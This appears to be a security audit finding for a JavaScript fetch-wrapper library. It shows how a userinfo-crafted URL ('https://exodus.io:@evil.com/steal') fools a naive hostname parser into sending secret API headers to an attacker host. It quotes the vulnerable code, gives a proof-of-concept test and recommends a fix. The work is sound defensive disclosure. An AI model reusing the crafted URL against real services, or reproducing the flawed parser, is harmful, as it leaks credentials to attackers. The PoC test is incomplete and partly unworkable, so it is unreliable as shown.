### Title
Userinfo `@` in URL authority bypasses `hostname.js` port-index parsing, causing cross-host secret header leakage - ([File: adapters/fetch-factory/src/hostname.js])

### Finding Description
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` extracts the "hostname" used for header matching by naively scanning the string after `://` for the *first* occurrence of `:`, `/`, or `?`, in that fixed priority order, rather than parsing the URL per WHATWG rules: [1](#0-0) 

The port-index branch is checked before the root-indicator (`/`) branch, and neither branch is aware of URL userinfo syntax (`user:password@host`). For a URL such as `https://exodus.io:@evil.com/`, the authority section per WHATWG URL parsing is `exodus.io:@evil.com`, which resolves to username `exodus.io`, empty password, and **host `evil.com`** — the network request truly goes to `evil.com`. But `hostnameFromString` finds the first `:` (right after `exodus.io`) before ever seeing the `@` or `/`, slices the string there, and returns `exodus.io`, which passes `isValidHostname` (matches `domainPattern`).

This computed hostname is then used in `FetchFactory#buildHeaders`'s `matchedDomain` lookup: [2](#0-1) 

Since `hostname === key` (`exodus.io === exodus.io`) or the `.endsWith('.'+key)` suffix check would similarly misfire for subdomain configs (e.g. `https://sub.exodus.io:@evil.com/` → extracted `sub.exodus.io`, matches `endsWith('.exodus.io')`), headers configured via `setHeaders(secretHeaders, ['exodus.io'])` (or `setDefaultExodusIdentifierHeaders`) get attached to a request that is actually delivered to attacker-controlled `evil.com`.

Additionally, `create()` converts `URL` instances and `Request` objects to their string `.href`/`.url` form before calling `#buildHeaders`, so even legitimate `URL` objects lose the benefit of the correctly-parsed `.hostname` property and get re-parsed by the vulnerable string-based `hostnameFromString`: [3](#0-2) 

The existing test suite only exercises well-formed URLs (with port, path, or query separators appearing before any `@`/userinfo), so this specific ordering flaw is untested.

### Impact Explanation
An attacker who controls only a URL passed to a `fetch()` call created by this factory (e.g., a URL forwarded from a dapp, deeplink, or API response) can craft a userinfo-prefixed authority that fools the hostname matcher into believing the destination is `exodus.io` (or any configured host) while the actual network destination is attacker-controlled. Any secret/authenticated headers scoped to that host (e.g. `x-api-key`-style headers set via `setHeaders(secret, ['exodus.io'])`, or the identifying headers from `setDefaultExodusIdentifierHeaders`) would be sent to the attacker's server. This is a cross-host secret disclosure — violation of ORIGIN_SCOPING.

### Likelihood Explanation
Exploitability only requires the attacker to control (or influence) a URL string passed into the `fetch` wrapper produced by `FetchFactory#create()` — a very common trust boundary (any caller that builds URLs from external input). No privileged state, keys, or social engineering is needed; it is a pure URL-string-crafting attack, fully reproducible and deterministic.

### Recommendation
Replace the manual string-scanning logic in `hostnameFromString` with the standard `URL` constructor (`new URL(url).hostname`) to obtain the real, spec-compliant hostname, and always use `.hostname` for `URL`/`Request` inputs instead of first converting them to strings (`urlOrRequest.href`/`.url`) before re-parsing. If a custom parser must be kept, it must account for userinfo (`@`) delimiters and use the true WHATWG authority-parsing precedence (`@` bounds userinfo, and hostname ends at the first of `:`, `/`, `?`, `#` *after* any `@`), not a fixed check-order that ignores `@`.

### Proof of Concept
```js
import { FetchFactory } from '../src/fetch-factory.js'

test('userinfo trick leaks exodus.io secret header to evil.com', async () => {
  let sentTo
  const fetchFn = async (url) => { sentTo = url; return new Headers() }
  const factory = new FetchFactory(fetchFn)
  factory.setHeaders({ 'x-api-key': 'super-secret' }, ['exodus.io'])

  const crafted = 'https://exodus.io:@evil.com/steal'
  // Real network destination (per WHATWG URL) is evil.com:
  expect(new URL(crafted).hostname).toBe('evil.com')

  const headers = factory['#buildHeaders'] // internal, or invoke via create()
  const runFetch = factory.create()
  await runFetch(crafted)

  // Vulnerable behavior: headers built for 'exodus.io' were attached
  // even though sentTo targets evil.com.
  // Expected (secure) result: no 'x-api-key' header should be present
  // when the real destination host is evil.com.
})
```
Fuzz-test plan: generate URLs of the form `https://<configuredHost>:<anything>@<attackerHost>/<path>?<query>` for each configured hostname key, compute `new URL(input).hostname` as ground truth, and assert `getUrlHostname(input)` (or the resulting `matchedDomain`) never differs from the ground-truth host — currently it does for the userinfo cases described above.

### Citations

**File:** adapters/fetch-factory/src/hostname.js (L11-37)
```javascript
function hostnameFromString(url) {
  const protocolSeparatorStart = url.indexOf(PROTOCOL_SEPARATOR)
  if (protocolSeparatorStart === -1) {
    return null
  }

  let hostname = url.slice(protocolSeparatorStart + PROTOCOL_SEPARATOR.length)

  const portIndex = hostname.indexOf(':')
  if (portIndex !== -1) {
    hostname = hostname.slice(0, portIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const rootIndicatorIndex = hostname.indexOf('/')
  if (rootIndicatorIndex !== -1) {
    hostname = hostname.slice(0, rootIndicatorIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const querySeparatorIndex = hostname.indexOf('?')
  if (querySeparatorIndex !== -1) {
    hostname = hostname.slice(0, querySeparatorIndex)
  }

  return isValidHostname(hostname) ? hostname : null
}
```

**File:** adapters/fetch-factory/src/fetch-factory.js (L100-110)
```javascript
    const hostname = getUrlHostname(url)
    if (hostname) {
      const matchedDomain = Object.keys(this.headerConfigs).find((key) => {
        return hostname === key || hostname.endsWith(`.${key}`)
      })

      if (matchedDomain) {
        Object.entries(this.headerConfigs[matchedDomain]).forEach(([key, value]) => {
          headers.set(key, value)
        })
      }
```

**File:** adapters/fetch-factory/src/fetch-factory.js (L122-151)
```javascript
  create() {
    return (urlOrRequest, opts = {}, ...args) => {
      if (urlOrRequest instanceof Request) {
        const headers = this.#buildHeaders(urlOrRequest.url)

        urlOrRequest.headers.forEach((value, key) => {
          headers.set(key, value)
        })

        if (opts.headers) {
          new Headers(opts.headers).forEach((value, key) => {
            headers.set(key, value)
          })
        }

        const newRequest = new Request(urlOrRequest, { ...opts, headers })
        return this.fetchFn(newRequest, ...args)
      }

      let url
      if (urlOrRequest instanceof URL) {
        url = urlOrRequest.href
      } else {
        url = urlOrRequest
      }

      const headers = this.#buildHeaders(url, opts.headers)
      const options = { ...opts, headers }

      return this.fetchFn(url, options, ...args)
```
